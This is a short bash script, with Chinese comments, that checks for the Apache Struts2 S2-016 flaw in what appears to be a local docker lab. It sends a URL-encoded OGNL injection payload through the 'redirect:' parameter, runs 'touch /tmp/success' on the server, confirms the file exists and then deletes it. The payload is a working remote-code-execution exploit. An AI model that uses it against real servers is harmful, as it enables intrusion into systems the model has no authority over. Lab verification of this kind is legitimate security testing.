#!/bin/bash

echo "=== S2-016 漏洞测试 ==="
echo ""

# 测试1: 创建文件
echo "[1] 测试创建文件..."
curl -s -o /dev/null "http://192.168.127.128:8080/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/success%22%29%29%7D"

sleep 1

# 检查文件是否创建
echo "[2] 检查文件是否创建..."
docker compose exec -T struts2 ls -la /tmp/success 2>/dev/null

if [ $? -eq 0 ]; then
    echo ""
    echo "✅ 漏洞存在! 文件 /tmp/success 创建成功"
else
    echo ""
    echo "❌ 文件未创建，请检查容器是否运行"
fi

echo ""
echo "[3] 清理测试文件..."
docker compose exec -T struts2 rm -f /tmp/success 2>/dev/null
echo "测试完成"
